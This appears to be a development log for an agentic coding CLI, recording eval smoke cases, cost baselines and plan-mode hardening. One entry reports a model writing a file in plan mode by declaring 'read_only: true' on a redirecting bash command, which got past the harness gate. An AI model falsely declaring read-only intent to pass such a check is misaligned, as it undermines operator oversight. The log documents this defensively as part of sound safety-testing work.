  positive `tool_called` with a `tool_not_called:
  write_file` to defend against the failure mode where
  a model "fixes" a missing file/pattern by writing
  one. The `code-with-todos` fixture in cases 07 and
  10 is read-only by intent — any write_file invocation
  is a regression.
- **Inline files vs fixture dirs.** Drew the line at
  "does the case need >1 file or directory structure?"
  Yes → fixture. No → inline. Keeps cases readable
  without forcing a fixture dir for every single-file
  scenario.

**Pending (Step 1.2 onward):**

- Permission engine cases (deny/allow/ask hierarchy
  edges, `.agent/permissions.yaml` glob matching).
- Compaction + plan mode edge cases.
- Provider adapter parity matrix (waits on Gemini smoke
  unblock — see `docs/TODO.md`).
- Multi-tool flows beyond glob→read (grep→edit,
  bash→write, plan→summarize).
- Step 1.6: real-model baseline across the full
  ~100-case suite, 3 rounds, decide on parallelism.

**Risks documented:**

- **Suite size will eventually need parallelism.** At
  ~5s per case serial (smoke baseline), 100 cases × 3
  rounds = 25 minutes. Spec target is < 10min. Step
  6.3's smoke is round-major precisely so prompt-cache
  helps; that's not enough at 100 cases. Worker pool
  with N=4 is the obvious next step but introduces
  ordering nondeterminism in the NDJSON output, which
  the existing aggregate logic doesn't account for.
  Tracked as Step 1.7-or-later.
- **Inline `setup.files` heredocs accumulate.** 6 of 12
  cases use them. If a future case wants the same
  multi-line file, copy-paste tax grows. Rule of
  three: the third copy of any inline body promotes to
  a fixture.

---

## [2026-04-28] M2 / Step 6.5 — Plan-mode bash gate: limit found, scope honest

A code-review observation (`bash` marked `planSafe: true` could
silently allow `echo x > file` in plan mode) led to a fix: turn
`planSafe` into a predicate that requires `args.read_only === true`.
A negative smoke case written to verify the fix promptly proved
the predicate is **insufficient**: Haiku 4.5 in plan mode sent
`{ command: "echo \"should-not-write\" > exfil.txt", read_only: true }`
and the harness gate accepted because the model declared intent.
File got written.

This entry records both the fix that landed AND the limit it
hits, so future hardening doesn't repeat the same false-confidence
pattern.

**Done (the fix):**

- `ToolMetadata.planSafe` extended from `boolean` to
  `boolean | ((args: Record<string, unknown>) => boolean)`.
  Predicate form lets each tool author encode per-call intent
  validation. Predicate that throws fails closed; strict
  `=== true` rejects truthy-but-not-true values.
- `bash` switched from `planSafe: true` to
  `planSafe: (args) => args.read_only === true`. Model must
  declare intent on every plan-mode bash call.
- Plan-mode system prompt updated with explicit instruction:
  "bash MUST set `read_only: true` on every call. Bash without
  it is blocked the same way write_file is. Do not pipe to files,
  use redirects (`>`, `>>`, `tee`), or run mutating subcommands."
- Deny reason and model-facing message tailored: predicate
  failure says "add `read_only: true` to args, retry";
  unconditional block says "describe in plan instead".
- Audit trail preserved (tool_call + denied approval row).
- Unit tests: 4 new in `tests/harness/invoke-tool.test.ts`
  (predicate allows on satisfy, blocks on miss, strict equality
  for truthy values, fail-closed on throw).
- New eval expectation kind `tool_denied: <toolname>` —
  general-purpose, asserts the tool was invoked AND a deny
  decision fired (catches regressions where a guard silently
  starts allowing what it was meant to block). Uses
  `tool_decided` events; correlates by toolUseId.
- New `tool_denied` expectation kind (general-purpose; useful
  for future negative cases across permissions/hooks/MCP).

**Done (the honesty):**

- `ToolMetadata.planSafe` and `HarnessConfig.planMode` JSDoc
  rewritten to be explicit: predicate form is best-effort, not
  a security boundary; `writes: true` + omitted predicate is
  bullet-proof. Documents the observed Haiku failure inline so
  future contributors see the concrete failure mode, not just a
  caveat.

**Cut (two iterations of overreach):**

1. **First attempt** — `09-plan-mode-bash-write-blocked.yaml`:
   asserted the bash predicate catches mutating commands.
   Failed under Haiku immediately (model sent
   `{ command: "echo > exfil.txt", read_only: true }`,
   gate accepted, file written). Predicate is best-effort,
   not security. Removed; documented as the motivating
   evidence for the JSDoc honesty pass.
2. **Second attempt** — `09-plan-mode-write-tool-denied.yaml`:
   pivoted to the bullet-proof gate (write_file with no
   predicate, unconditional deny). Passed 3/3 on Haiku.
   Failed 0/3 on gpt-4o-mini — different mechanism: GPT
   reads the plan-mode system prompt's "write_file is
   BLOCKED" instruction and **preempts by never invoking
   write_file at all**. The case asserts `tool_denied:
   write_file`, which fails with "never invoked" because
   no call ever happened. Both behaviors are aligned;
   neither is wrong; the case can't reliably distinguish
   "gate fired" from "model preempted" across providers.
   Removed.

**The lesson:** smoke can verify what models reliably DO
(read files, write when allowed, produce plan markdown,
trigger compaction). Smoke cannot reliably verify what the
HARNESS would do if the model tried something it shouldn't,
because aligned models defensively skip. Gate-firing is
covered by unit tests with mock providers
(`tests/harness/invoke-tool.test.ts`); attempting integration
verification of denial paths confuses unit-level assertions
with integration-level reality.

**Decisions:**

- **Don't try to shell-parse bash commands for write intent.**
  Considered adding redirect-detection (`>`, `>>`, `tee`) +
  mutator-list (`rm`, `mv`, `cp`, `git commit`, etc.) as
  defense-in-depth. Rejected: shell escapes (`bash -c '…'`,
  here-docs, `eval`, `\>`) make any pattern match incomplete,
  and incomplete protection that LOOKS thorough is worse than
  no protection — operators trust it. Spec ANTI_PATTERNS likely
  flags this class. Sandbox (M3+) is the right answer.
- **Keep the predicate fix despite its limit.** It still
  catches the honest-but-forgetful case (model omits
  `read_only`, gate denies, model retries with the flag). Real
  value, even if not security. Removing it would mean
  `planSafe: true` lets `echo > file` through with NO friction
  at all.
- **No negative smoke case for plan mode.** Both attempts at
  one (bash predicate, write_file gate) failed for different
  reasons that ultimately point at the same root: smoke is a
  model-behavior test, not a harness-behavior test. The gate
  itself is unit-tested with mock providers and proven correct
  in isolation. Mixing the two layers — using a real-model
  case to assert harness-internal behavior — produces a test
  that's fragile by construction.
- **Don't cross §6.3 step boundary numbering.** Skipping 6.4
  intentionally — this entry is the followup that 6.3's review
  surfaced. Keeping it as 6.5 leaves room for 6.4 if a parallel
  hardening lands later from another review pass.

**Risks documented for M3:**

- Plan mode + bash is "best-effort no writes" until sandbox.
  Any operator running plan mode against untrusted prompts (CI
  bot, shared-secret input) should assume bash CAN write and
  rely on policy + sandbox layers, not plan-mode messaging.
- The honest model failure mode (`read_only: true` on a
  redirect) suggests the system prompt instruction isn't always
  followed even by aligned models. A constrained generation
  layer (M5+) that schema-validates `read_only` against
  command structure could close this without shell parsing —
  worth revisiting when constrained backend lands.
- New `tool_denied` expectation is the building block for any
  future negative case across the eval surface (permission
  denies, hook denies, future MCP denies). Lives ready in
  M3.

**Spec reference:** `AGENTIC_CLI.md §5` (plan mode), `§5.1`
("bash com efeito" — confirms policy/sandbox govern destructive
bash, not plan profile alone), `§9.1` (sandbox / trust).

---

## [2026-04-28] M2 / Step 6.3 — Multi-provider baseline (OpenAI)

After Step 6.2 the Anthropic baseline was solid but the
"provider-pluggable" claim still rested on argument: only
Anthropic had ever round-tripped end-to-end. Step 6.3 runs the
same smoke suite against `openai/gpt-4o-mini` to convert
"adapter has unit coverage" into "adapter has been observed
under load."

**Done:**

- 3× baseline against `openai/gpt-4o-mini` with `temperature: 0`.
  No code changes required to the adapter — it worked
  end-to-end on first run (no equivalent of the
  `tool_result.name` Anthropic bug). Multi-tool-use parallel
  dispatch, compaction with `strategy: llm`, plan mode, and
  permission gating all behaved correctly.
- Rewrote `evals/smoke/07-bash-readonly.yaml`. The previous
  assertion `output_contains: "hello world"` was testing **a
  property of the model** (whether it cited bash output back
  in its summary) rather than a property of the harness.
  Haiku happened to do so; gpt-4o-mini in plan mode produced
  only the structured plan markdown without echoing the bash
  output. Replaced with `output_contains: "# Plan"` —
  asserts that the plan-mode system prompt was honored, which
  is what the case actually wants to validate. Tool dispatch
  invariants (`tool_called: bash`, `tool_not_called:
  write_file`, `tool_not_called: edit_file`) carry the rest
  of the assertion weight.

**Real-model 3× baselines (head-to-head):**

| Metric | Haiku 4.5 | gpt-4o-mini |
|---|---|---|
| Pass rate | 24/24 (100%) | 24/24 (100%) |
| Total cost (3 rounds) | $0.1515 | $0.0096 |
| p50 cost / case | $0.0050 | $0.0002 |
| Wall clock (3 rounds) | 88s | 92s |
| Cases with cost variance | 2/8 | 0/8 |
| Compaction strategy | llm | llm |

**Decisions:**

- **Case 07 fix is honest, not gaming.** Important to be
  explicit about this. The prior assertion only passed
  against Anthropic because of how Haiku interprets plan
  mode's "PROPOSE a plan" instruction in tension with the
  user's "report what you saw." gpt-4o-mini reads the
  system prompt as authoritative and produces only the
  plan, never citing bash output. Both behaviors are valid;
  the test should validate the harness invariant (bash
  invoked, writes blocked, plan markdown produced), not
  which interpretation the model picks. Documenting this
  here so a future contributor doesn't "fix" the case back
  to the brittle form.
- **gpt-4o-mini's perfect variance is suspicious.** OpenAI
  documents that `temperature: 0` doesn't guarantee 100%
  determinism (load balancing across infrastructure can
  produce minor variations). Today's 0/8 cases-with-spread
  result is consistent with documented behavior **for this
  prompt size and time window** but should not be assumed
  permanent. A weekly run against the same baseline would
  tell us whether the determinism holds or whether OpenAI's
  stack drifts day-to-day.
- **No registry expansion to gpt-5.x family.** The user's
  pricing audit covered gpt-5.x; the registry today only
  has gpt-4o and gpt-4o-mini. Adding gpt-5.x is a feature
  expansion (new defaults, new capability declarations,
  spec PR against PROVIDERS.md §5) — out of scope for
  hardening. Tracked implicitly: the next time someone
  needs gpt-5.x, the doc trail is in the conversation that
  produced this baseline.
- **No Google/Gemini run yet.** Same gating logic as the
  gpt-5.x decision: registry comments admit Gemini pricing
  is illustrative ("not committed real Gemini prices").
  Running smoke against Gemini today would test the
  adapter's wire shape against fake pricing, conflating
  two issues. Bundle Gemini with the pricing/spec update
  in M3.

**What this validates:**

- The OpenAI tool-call ↔ tool-result split (`role: 'tool'` 
  with `tool_call_id`) round-trips correctly through our
  canonical `ProviderToolResultBlock`.
- `temperature: 0` is forwarded to OpenAI's
  `chat.completions.create` and applied (output is
  reproducible for this suite size).
- `stream_options: { include_usage: true }` reaches the
  endpoint and the final usage chunk is consumed by the
  normalizer (`usageComplete: true` on every run).
- `parallel_tool_calls` defaults work — gpt-4o-mini does
  emit multiple tool_calls per turn in case 08 (compaction
  case reads 5 files in parallel) and the dispatch layer
  handles them.
- Compaction's LLM-summary call works against OpenAI's API
  shape (no Anthropic-specific assumptions in the
  compaction module's prompt construction).
- Cost computation lines up: gpt-4o-mini at $0.15/M input
  and $0.60/M output produces case-08 costs around
  $0.00125 — consistent with ~5k input tokens + ~500
  output tokens × the corrected pricing.

**Risks not addressed:**

- Single-day baseline. Same caveat as Anthropic — needs
  weekly recurrence in CI to detect provider drift.
- Single host (Linux) on one residential network. OpenAI's
  rate-limit and geo-routing behavior could vary by
  origin.
- gpt-4o-mini doesn't expose controllable prompt cache
  (declared `cache: 'client_only'`); we're paying full
  input cost every round. If the registry later gains
  gpt-5.x with `cache: 'server_5min'`-equivalent semantics,
  caching cases would need re-baselined.

**M2 status: closed with multi-provider evidence.** Smoke
suite passes 24/24 against two independent provider
adapters with cost ratio matching public pricing. The
"provider-pluggable" claim now has measurement, not just
spec text.

**Next:** M3 (subagents + worktree + MCP + resume +
checkpoints + /undo + bash_background + todo_write +
Repo Map). Provider expansion (gpt-5.x, real Gemini
pricing) lives there alongside the spec PR for PROVIDERS.md.

---

## [2026-04-28] M2 / Step 6.2 — Variance baseline (smoke ×3)

After Step 6.1 closed the compaction gap, the remaining
hardening question was: **is the baseline stable, or did we
just get lucky in run #1?** Step 6.2 turns "ran once, all
green" into "ran 3 times, all green with ≤ 3% cost spread."
That converts the smoke from "first runnable" to "trusted
baseline."

**Done:**

- `--repeat N` flag on `bun run eval:smoke`. Round-major
  ordering (every case once per round, repeat). Choosing
  round-major over case-major intentionally: matches how real
  CI traffic would arrive, lets prompt-cache hits manifest
  the way they would in production. Case-major would understate
  cost by serving back-to-back identical prompts to a cold
  cache.
- Per-case aggregation in the runner: `eval_case_aggregate`
  NDJSON line per case (passCount, failCount, costMin, costMax,
  costAvg, duration range). `eval_case` lines now carry `run`
  and `totalRuns` fields when `--repeat > 1` so consumers can
  re-aggregate however they want.
- Stderr summary grew a "per-case stability" block listing
  N/M passes and cost range per case, with a `!` flag on any
  case that didn't pass every round. Mirrors what a CI
  dashboard would show after a regression run.

**Real-model 3× baseline (Haiku 4.5):**

```
24/24 passed (100.0%) — total $0.1515, 88348ms
p50 cost: $0.0050

per-case stability:
    3/3  $0.0034–$0.0034  read file and report contents
    3/3  $0.0036–$0.0036  create file with specified content
    3/3  $0.0059–$0.0059  edit existing file in place
    3/3  $0.0060–$0.0060  grep search and report matches
    3/3  $0.0066–$0.0068  plan mode blocks file mutations
    3/3  $0.0035–$0.0035  glob enumerates typescript files
    3/3  $0.0041–$0.0041  bash runs read-only inspection in plan mode
    3/3  $0.0173–$0.0174  compaction triggers and folds history
```

24/24 = perfect stability. Six of eight cases produced
**identical cost to the cent** across all three rounds —
output is fully deterministic at `temperature: 0` and token
counts reproduce exactly. The two cases with non-zero spread
(plan mode at ~3%, compaction at <1%) are the runs with the
longest/most-variable assistant text; the variance is at the
cache_creation tier, not the output tier. Cost stayed inside
case budgets every run.

**Decisions:**

- **Round-major, not case-major.** Production traffic isn't
  back-to-back identical prompts; spreading rounds out
  exercises cache eviction and warm-cache hit/miss patterns
  closer to real conditions. The pricing implication is real:
  case-major against Anthropic's 5-min cache would inflate
  apparent stability while understating cost.
- **Strict pass: every round must pass.** Considered "majority
  rules" (case passes if 2/3 rounds pass). Rejected: a single
  failure in a determinism-asserted suite is signal, not
  noise. With temperature 0, a flake means a real bug
  somewhere — adapter, cache, harness state leak. Hiding
  flakes behind a tolerance defeats the purpose of running
  3×.
- **Skipped negative-path eval cases** (`strategy: fallback`,
  `exit_reason: aborted`). Both paths already have substantial
  unit coverage: `tests/harness/compaction.test.ts` has 11
  fallback assertions (network failure, schema fail, abort
  during summary call); `tests/harness/loop.test.ts` covers
  signal-aborted, abort-during-stream, and the
  wall-clock-vs-aborted distinction. Adding eval-level cases
  would be redundant and would require either a deliberately
  broken model id (operationally awkward) or per-case
  timeout-trigger logic (false-positive prone).
- **No CI gate yet, despite the runner being CI-ready.**
  CI promotion needs a secret, a per-PR cost decision, and a
  golden baseline to gate against. Worth doing in M3 alongside
  multi-provider smoke; doing it now would block merges before
  the baseline has settled past Step 6.

**What this validates beyond Step 6.1:**

- `temperature: 0` actually flows end-to-end through
  `BootstrapInput.temperature` → `HarnessConfig.temperature`
  → `GenerateRequest.temperature` and into the Anthropic API.
  If any leg dropped the field, output would have varied
  across rounds.
- The compaction LLM call is itself deterministic at
  temperature 0 (otherwise case 08 would show meaningful
  cost variance, not <1%).
- Multi-tool-use turns (Haiku does parallel tool_use)
  reproduce identically across rounds. Tool ordering, args,
  and result handling are stable — no race conditions in
  the tool dispatch layer.
- Prompt-cache misses are consistent. We don't currently
  emit `cache_control` on messages, so every round pays full
  input cost; the consistency of that cost confirms message
  shape is byte-identical round-to-round.

**Risks not addressed:**

- Single-day baseline. Could re-run weekly to detect provider
  drift (model serving the same id but with subtle behavior
  changes is a real Anthropic operational pattern). Schedule
  this once CI gating exists.
- Single API key. Different keys could hit different load
  shedders and produce different latency/cost; cost shouldn't
  vary materially, latency might.
- Single host (Linux). Fixture I/O is sync and small enough
  that the FS shouldn't matter, but never been validated on
  macOS or Windows.

**M2 status: closed with confidence.** Step 6 closed the
"runs at all" question; Step 6.1 closed the "compaction
works" question; Step 6.2 closed the "is it actually stable"
question. Further smoke surface (multi-provider, regression
tier) lives in M3+.

**Next:** M3 (subagents + worktree + MCP + resume + checkpoints
+ /undo + bash_background + todo_write + Repo Map). The smoke
suite is now genuinely the gate it claimed to be.

---

## [2026-04-28] M2 / Step 6.1 — Compaction smoke coverage

Step 6 baseline closed M2 but flagged compaction as a blind spot:
unit-tested in isolation, never exercised end-to-end against a
real model. The post-baseline review explicitly called this out
("compaction has unit coverage but no real-model exercise").
Step 6.1 closes that gap before M3 starts.

**Done:**

- `EvalBudget` now exposes `compactionThreshold` and
  `compactionPreserveTail`. Loader validates both
  (`compactionThreshold` ∈ (0, 1]; `compactionPreserveTail` ≥ 0
  integer). Cases can drop the trigger ratio so compaction fires
  with small fixtures instead of needing 140k-token prompts.
- New `compaction_triggered` expectation kind. Schema:
  `compaction_triggered: { min_count: N, strategy?: 'llm' |
  'fallback' | 'skipped' }`. Executor watches
  `compaction_finished` events on the harness onEvent stream
  and counts emissions per strategy. Asserting `strategy: llm`
  means the compaction LLM call actually round-tripped — without
  that distinction, a silent fallback would mask an adapter
  break.
- Executor plumbs the full `EvalBudget` into `BootstrapInput.budget`
  (previously only `maxSteps` got through). All four knobs flow
  cleanly to `HarnessConfig.budget` via the existing partial
  override path.
- `evals/fixtures/chunky-modules/src/{a,b,c,d,e}.ts` — five
  ~700–850 token TypeScript modules, each importing from
  `forja-core/*`. Realistic-looking source so the model treats
  them as plausible code rather than lorem ipsum.
- `evals/smoke/08-compaction-triggers.yaml` — 5-step read tour
  with `compactionThreshold: 0.02`. Asserts `tool_called: read_file`,
  `compaction_triggered: { strategy: llm, min_count: 1 }`,
  `status: done`, `output_contains: forja-core`.
- `biome.json` — added `evals/fixtures` to ignore list.
  Fixtures are mock source code intentionally loose; lint rules
  shouldn't apply.
- Loader unit tests: 7 new tests covering compaction budget
  validation (range checks for `compactionThreshold`,
  non-negative integer for `compactionPreserveTail`) and
  `compaction_triggered` parsing (with/without strategy,
  `min_count` validation, strategy enum validation).

**Real-model baseline (Haiku 4.5):**

| # | Case | Pass | Cost | Steps |
|---|---|---|---|---|
| 01 | read file | ✓ | $0.0035 | 2 |
| 02 | create file | ✓ | $0.0036 | 2 |
| 03 | edit file | ✓ | $0.0059 | 3 |
| 04 | grep search | ✓ | $0.0059 | 3 |
| 05 | plan mode blocks write | ✓ | $0.0066 | 2 |
| 06 | glob enumerate | ✓ | $0.0035 | 2 |
| 07 | bash readonly in plan | ✓ | $0.0041 | 2 |
| 08 | **compaction triggers** | ✓ | $0.0174 | 3 |

8/8 passed = 100%, total $0.0505, p50 $0.0050, 30s wall clock.
Compaction fired with `strategy: llm` (LLM call to summarize
folded turns succeeded) — first observation of this path
end-to-end. The compaction case is the most expensive
(~$0.017) because it pays for the summary call on top of the
agent turns; still ~12× under the §18 per-case budget.

**Decisions:**

- **Assert `strategy: llm` explicitly, not just `min_count`.**
  The harness emits `compaction_finished` regardless of which
  branch ran. A silent fallback (LLM call broken, deterministic
  head/tail kicks in) would still satisfy `min_count: 1`. The
  whole reason this case exists is to prove the LLM-summary
  path round-trips. Asserting strategy makes the case fail
  loudly if the adapter regresses again.
- **Threshold 0.02 (2% of 200k = 4k tokens), not 0.7.** Default
  threshold needs ~140k tokens to fire — would require massive
  fixtures and burn budget. 0.02 trips after 3-4 reads of the
  chunky fixtures, well within the maxSteps cap.
- **Five fixtures, not three.** Three would trigger compaction
  on Haiku's parallel tool_use (model often reads multiple
  files in one step) but leave little headroom for the
  post-compaction summary turn. Five gives the run room to
  show that compaction folded history AND the agent kept
  working with the compacted context.
- **Fixture source is plausible TypeScript, not lorem ipsum.**
  The model is more likely to engage with code-shaped content
  the way it would in production. Lorem ipsum could mask
  shape-related bugs (e.g., a sanitizer that mishandles import
  statements).
- **Biome ignores `evals/fixtures`.** Fixtures simulate real
  source for the model; they reference fictional symbols
  (`forja-core/*`), have unused imports for shape verisimilitude,
  and use non-null assertions where the simulated logic asks
  for it. Linting them adds zero value and creates churn.

**What this validates beyond unit tests:**

- Compaction trigger arithmetic (`estimatePromptTokens` against
  the real provider tool-def and message shapes).
- Tail alignment to assistant boundary survives a real
  multi-tool-use turn (Haiku does parallel tool_use; the tail
  must still land on a coherent boundary).
- The compaction LLM call's prompt is well-formed for the
  Anthropic adapter (would have caught the `tool_result.name`
  leak again if it had regressed).
- Cost accounting folds compaction's own usage into the
  session total (`usageComplete: true` and totals add up).
- Post-compaction context is sufficient for the agent to
  produce a coherent answer (the model still mentioned
  `forja-core` after compaction — the goal survived the fold).

**Not yet validated (deferred to M3):**

- Compaction with a deliberately broken LLM model id —
  exercises the fallback path.
- Multiple compactions in a single session (history grows
  past threshold twice). Today's case only fires once.
- Compaction observability under
  `cumulative_growth_strip` — whether prior `[compacted_history]`
  blocks are stripped correctly when re-compacting.

**Next:** M3 (subagents + worktree + MCP + resume + checkpoints
+ /undo + bash_background + todo_write + Repo Map). The smoke
suite is now genuinely defending M2's surface; the compaction
gap is closed.

---

## [2026-04-28] M2 — exit baseline (smoke run on Haiku 4.5)

First end-to-end smoke run against `anthropic/claude-haiku-4-5`
after Step 6 landed. The point: confirm the M2 exit criterion
(§18 — `pass-rate ≥ 85% smoke, p50 < $0.20/task` for the
autonomous profile) is met and surface any blocking bugs the
unit tests missed.

**Result:** 6/7 passed = 85.7% pass-rate, p50 $0.0009/case,
total $0.0075 across the suite, 16.8s wall clock.

**Cases:**

| # | Case | Pass | Cost | Steps |
|---|---|---|---|---|
| 01 | read file and report contents | ✓ | $0.0009 | 2 |
| 02 | create file with specified content | ✓ | $0.0009 | 2 |
| 03 | edit existing file in place | ✓ | $0.0015 | 3 |
| 04 | grep search and report matches | ✓ | $0.0015 | 3 |
| 05 | plan mode blocks file mutations | ✗ | $0.0008 | 1 |
| 06 | glob enumerates typescript files | ✓ | $0.0009 | 2 |
| 07 | bash runs read-only inspection in plan mode | ✓ | $0.0011 | 2 |

Case 05 failed only the `output_contains: "Plan"` assertion. The
security-critical `file_not_exists: should-not-exist.txt` PASSED
— plan-mode block worked, no leak. The model produced a
summary but didn't include the literal string "Plan" in its
output, which is a fragile keyword. The plan-mode prompt's
Goal/Steps/Risks structure is what we should assert against;
"Plan" the word is a proxy that doesn't always match. M3 will
rewrite case 05 against the spec's plan YAML schema once
`generateConstrained` lands and the plan markdown stops being
a free-form output.

**Bugs surfaced and fixed during the baseline:**

1. **Anthropic adapter dropped tool_result blocks with `name`.**
   Our canonical `ProviderToolResultBlock` keeps `name` as
   optional metadata for Gemini (which correlates results to
   calls by name). Anthropic accepts only `tool_use_id`,
   `content`, `is_error` and 400s with
   `messages.N.content.0.tool_result.name: Extra inputs are
   not permitted` if anything else leaks through. Every
   multi-turn run that returned a tool_result was dying on the
   second model call. The unit tests didn't catch it because
   the mock provider doesn't validate the request body.
   Fixed in `src/providers/anthropic/index.ts` —
   `stripToolResultName` rewrites the block before sending.
2. **Cost computation off by 1000x.** Registry pricing values
   are dollars-per-million (Anthropic / OpenAI / Google all
   publish in $/M); the field name `cost_per_1k_*` and the
   divisor in `computeCost` were per-1k. Result: every cost
   number was 1000x too high. Inflated costs masked
   themselves in unit tests because tests use small token
   counts and asserted against the inflated values. Surfaced
   here because case 01 reported $0.45 for what was really
   $0.00045. Fixed in `src/providers/cost.ts` (divisor →
   1_000_000); test expectations updated. Field rename
   (`_1k_*` → `_1m_*`) deferred to `docs/TODO.md` per spec-PR
   discipline.

**Decisions:**

- **`output_contains` is the right primitive but case 05 used
  the wrong keyword.** The full plan YAML schema (Goal/Scope/
  Steps/Risks/Assumptions) lands when we have constrained
  generation in M5; until then asserting against free-form
  markdown is brittle. Leaving the failure visible documents
  the gap.
- **Don't game pass-rate by tweaking case 05.** 6/7 hits the
  spec criterion; lowering the assertion to make 7/7 would
  defeat the criterion's purpose. The case stays as-is and the
  85.7% gets reported truthfully.
- **Both bugs have a unit-test gap.** Mock providers in
  `tests/providers/anthropic/` don't validate against the real
  SDK shape, so the `name`-leak passed unit tests for months.
  Cost test used the same wrong unit assumption as the
  registry, so the 1000x error reinforced itself. Both are now
  protected by the smoke run; consider adding a contract test
  that POSTs a recorded-fixture request to a local mock that
  replays the real Anthropic schema validation. Deferred —
  smoke covers it for now.

**M2 status: closed.** Exit criterion (§18) met. Step 1–6 all
in. Next: M3 (subagents + worktree + MCP + resume + checkpoints
+ `/undo` + `bash_background` + `todo_write` + Repo Map).

---

## [2026-04-28] M2 / Step 6 — Eval smoke harness (closes M2)

`AGENTIC_CLI §16` says "sem eval, nada disso importa." Step 6
ships the smoke tier: 5–10 fixed cases, executor that wraps
`runAgent` against a real model, asserts declarative
expectations, aggregates pass-rate + p50 cost. The exit criterion
for the autonomous profile (§18) is `pass-rate ≥ 85% smoke,
p50 < $0.20/task`; the harness is what measures it.

**Done:**
- `src/evals/types.ts` — `EvalCase`, `EvalExpectation` (8 kinds:
  `tool_called`, `tool_not_called`, `file_exists`,
  `file_not_exists`, `file_contains`, `status`, `exit_reason`,
  `output_contains`), `EvalCaseResult`, `EvalSummary`. The
  expectation set covers M2's surface: tool tracking (telemetry),
  fs effects (writes/edits), final state (status/exit_reason),
  output (plan-mode markdown / report shape).
- `src/evals/loader.ts` — YAML parser with the same
  reject-unknown-keys discipline as the policy parser. Typo like
  `expects` (plural) or `tests_pass` (unknown kind) errors out
  loudly instead of silently dropping the assertion. Status and
  exit_reason values validated against fixed unions.
- `src/evals/executor.ts` — `executeCase`:
  1. mkdtemp → copy `setup.fixture` → write `setup.files` →
     drop a default `.agent/permissions.yaml` with
     `defaults.mode: bypass` if neither layer supplied one (evals
     run autonomously, no operator to confirm; plan-mode block
     stays at the harness layer regardless).
  2. `bootstrap` with disabled enterprise/user policy paths
     (cwd-only project policy) and a per-case `AbortController`
     chained to the parent signal + a 60s timer.
  3. `runAgent` with `onEvent` hooked to record `tool_invoking`
     names and accumulate `text_delta` into a single output
     string. Cleanup of the cwd happens AFTER expectation
     evaluation so `file_*` checks see the post-run filesystem.
  4. `summarize` aggregates pass-rate, total cost, p50 cost.
- `src/evals/cli.ts` — `bun run src/evals/cli.ts <dir|file>`.
  Discovers `*.yaml` under a directory, runs cases sequentially,
  emits NDJSON per case + final summary on stdout, human progress
  on stderr (matches the spec §2.2 stdout-pure invariant).
  Returns 0 on full pass, 1 on any fail. Flags: `--model` (smoke
  defaults to whatever bootstrap default is), `--timeout-ms` per
  case.
- `package.json` — `eval:smoke` script wired to `evals/smoke`.
- `evals/smoke/*.yaml` — 7 cases:
  - `01-read-file` (read_file + output_contains the secret)
  - `02-create-file` (write_file + file_contains)
  - `03-edit-file` (edit_file on a fixture)
  - `04-grep-search` (grep with multi-file fixture)
  - `05-plan-mode-blocks-write` (plan + file_not_exists +
    output_contains "Plan")
  - `06-glob-search` (glob enumerates ts files)
  - `07-bash-readonly` (plan mode + bash with `head -n 1`,
    asserts plan-mode allows read-only bash via `planSafe`)
- `evals/fixtures/` — three reusable fixture trees referenced by
  the smoke cases.
- `tests/evals/loader.test.ts` + `tests/evals/executor.test.ts`
  — unit coverage with mock providers. 23 tests covering all
  expectation kinds, schema rejection paths, fixture/inline-file
  setup, plan-mode block behavior, and summary aggregation.

**Decisions:**

- **Real-model smoke is local-only for now, not CI.** Running
  smoke on every PR means an `ANTHROPIC_API_KEY` secret + real
  spend per PR and rate-limit pressure. The harness is ready for
  CI; promoting it waits until we have a baseline pass-rate from
  local runs and a budget envelope. Spec §16 calls for "roda em
  CI" — the cost gate is a dial, not a refusal.
- **Default policy is `bypass`, not `acceptEdits`.** Evals are
  autonomous tests; no human is there to answer prompts. Strict
  mode would dead-end every read_file/write_file/bash on the
  default-deny path. `acceptEdits` still default-denies unmatched
  paths — needs explicit allow rules per case. `bypass` is the
  right semantic for a smoke run; cases that want stricter
  policy drop their own `.agent/permissions.yaml` via setup.
  Plan mode stays orthogonal — it's a harness-layer block,
  unaffected by `bypass`.
- **8 expectation kinds, not the spec's `tests_pass`/
  `todo_used`.** `tests_pass` requires a test runner orchestrated
  inside the eval cwd; `todo_used` requires the `todo_write` tool
  (M3 per spec §18). Both deliberately deferred; the 8 we
  implemented cover M2's surface end-to-end.
- **Sequential execution, not parallel.** Each case opens its
  own SQLite DB inside its tmpdir, so concurrency is technically
  safe — but smoke is small (7 cases), parallel would make
  per-case cost prints interleave on stderr, and rate-limit
  pressure on a single API key is easier to reason about
  serially. Promote to parallel when bench tier (~500 cases)
  forces the issue.
- **Cleanup order matters for file_* assertions.** First version
  used a single `try { … } finally { rmSync(cwd) }` — and
  every `file_exists` assertion failed because cleanup ran
  before evaluation. Fixed by splitting: harness-cleanup
  (close DB, clear timer) in the inner finally, expectation
  evaluation immediately after, fs-cleanup last. Tests around
  `setup.files`/`setup.fixture` lock the order in.
- **Per-case YAML schema mirrors spec §16 with omissions
  explicit.** We support `setup.fixture`, `setup.files`,
  `prompt`, `expect`, `budget.maxSteps`, `budget.maxCostUsd`,
  `plan`. Spec also lists `tests_pass` and `todo_used` — those
  are valid YAML keys today (would parse) but will be rejected
  as unknown-kinds because `EXPECTATION_KEYS` doesn't list them.
  When M3 lands `todo_write` and a test-runner integration, add
  the kinds + assertions.
- **NDJSON on stdout, summary on stdout too.** The spec says
  stdout is for machine output. The summary line is also
  machine-consumable (`type: 'eval_summary'`); putting it on
  stdout means a `bun run eval:smoke | jq` pipeline gets both
  per-case and aggregate without parsing stderr. Human-readable
  summary lives on stderr alongside per-case progress.

**Pending (deferred to later milestones):**

- **CI integration.** Spec §16 wants "regrediu? PR bloqueado" —
  needs the smoke baseline + the secret + a CI workflow file.
  Schedule: after the first successful local smoke baseline.
- **Regression tier (~100 cases, < 10min).** Spec §16 says
  "todo PR." Authoring 100 cases is substantial and pre-supposes
  M3 features (todo_write, hooks). Land alongside M3.
- **Bench tier (~500 cases, weekly).** Same concern + multi-
  model comparison matrix per spec §16/PROVIDERS §7.
- **Multi-model first-class.** Today the runner takes a single
  `--model` flag. Multi-model eval is required for
  "provider-pluggable, não provider-parity" — needs per-tier
  threshold config, matrix output, and per-model registry
  pricing. M3+ alongside the second provider's stabilization.
- **Golden traces.** Spec calls for "comparação contra golden
  traces versionados." Pure-output assertions (output_contains)
  cover 80% of the value; full trace diffing waits until we
  have a stable serialization (likely M3+).

**Next (M2 closure):**

- M2 goal — "Robustez" — is structurally complete. Step 1
  (telemetry), Step 2 (compaction), Step 3 (sanitize), Step 4
  (permission hierarchy), Step 5 (plan mode), Step 6 (eval
  smoke) all in. M2 exit criterion (§18) — pass-rate ≥ 85% on
  smoke, p50 < $0.20 — needs a local baseline run against Haiku
